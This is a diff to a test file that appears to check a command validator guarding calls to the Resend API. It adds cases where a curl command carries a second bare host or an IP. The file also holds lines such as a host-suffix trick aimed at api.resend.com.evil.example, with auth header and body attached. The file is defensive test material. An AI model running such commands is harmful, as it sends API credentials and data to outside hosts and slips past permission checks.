@@ -57,6 +57,8 @@ CASES = [
     ("method from a variable, emails", f"curl -s -X $M https://api.resend.com/emails {A}", True),
     ("-K config file may carry its own URL", f"curl -K /tmp/curlrc -X POST https://api.resend.com/webhooks {A} {BODY}", True),
     ("method from a variable on /webhooks stays closed", f"curl -X \"$M\" https://api.resend.com/webhooks {A} {BODY}", True),
+    ("bare second host without scheme (didi LOW)", f"curl -s -X POST https://api.resend.com/webhooks relay.example.org {A} {BODY}", True),
+    ("bare second host, IP", f"curl -s -X POST https://api.resend.com/webhooks 10.0.0.5 {A} {BODY}", True),
     ("wget POST /emails", "wget --post-data='{}' https://api.resend.com/emails", True),
     ("host suffix trick", f"curl -s -X POST https://api.resend.com.evil.example/webhooks https://api.resend.com/emails {A} -d '{{}}'", True),
     ("subdomain is not the API host", f"curl -s -X POST https://x.api.resend.com/webhooks {A} -d '{{}}'", True),
